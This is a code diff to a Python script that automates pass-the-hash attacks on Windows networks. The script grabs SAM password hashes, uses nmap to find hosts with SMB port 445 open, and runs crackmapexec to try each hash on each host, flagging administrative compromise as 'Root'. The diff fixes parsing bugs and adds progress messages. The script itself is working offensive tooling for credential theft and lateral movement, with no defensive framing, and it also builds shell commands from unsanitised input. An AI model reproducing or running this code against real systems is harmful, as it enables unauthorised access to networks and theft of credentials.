@@ -17,20 +17,21 @@ def samGrab(ip, username, password):
 # ip: a string IP address (potentially containing ranges) for the network
 # Returns: a list of Windows IP addresses
 def osFingerprint(ipRange):
-    command = 'nmap -O ' + ipRange
-    output = subprocess.check_output(command, shell=True).decode("utf-8").split('\n')
+    command = 'nmap -p 445 --open ' + ipRange
+    output = subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
     output = output[2:]
     result = [];
     chunks = [];
     while len(output) > 0:
-        while output[0] == '':
+        if output[0] == '':
             output = output[1:]
         if len(output) == 0:
             continue
         pt = 0
-        while output[pt] != '':
+        while pt < len(output) and output[pt] != '':
             pt = pt + 1
         chunks.append(output[0:pt])
+        output = output[pt:]
     for c in chunks:
         thisip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', c[0])
         if len(thisip) == 0:
@@ -42,7 +43,7 @@ def osFingerprint(ipRange):
             if '445/tcp' in c[i]:
                 windows = True
         if windows:
-            result.append[thisip]
+            result.append(thisip[0])
     return result
 
 # Step 3: use crackmapexec to try and log on to the windows machines
@@ -52,7 +53,7 @@ def osFingerprint(ipRange):
 def attemptLogon(hashes, ips):
     results = {}
     for ip in ips:
-        for (username, hash) in hashes:
+        for username, hash in hashes:
             command = 'crackmapexec ' + ip + ' -u ' + username + ' -H ' + hash + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '{if($6 ~ /^\[-\]$/) {print "Failed"} else if($6 ~ /^\[\+\]$/) {if($9 == "(Pwn3d!)") {print "Root"} else {print "Login"}}}'"""
             result = subprocess.check_output(command,
                     shell=True).decode("utf-8").strip()
@@ -113,8 +114,11 @@ def main():
         return 1
 
     sam_hashes = samGrab(args.ip_address, args.username, args.password)
+    print('Hashes acquired')
     ip_addrs = osFingerprint(args.ip_range)
+    print('Windows boxes located')
     formatted_sam_hashes = formatCrackmapSam(sam_hashes)
+    print('Hashes formatted')
     result_dict = attemptLogon(formatted_sam_hashes, ip_addrs)
     print(result_dict)
 
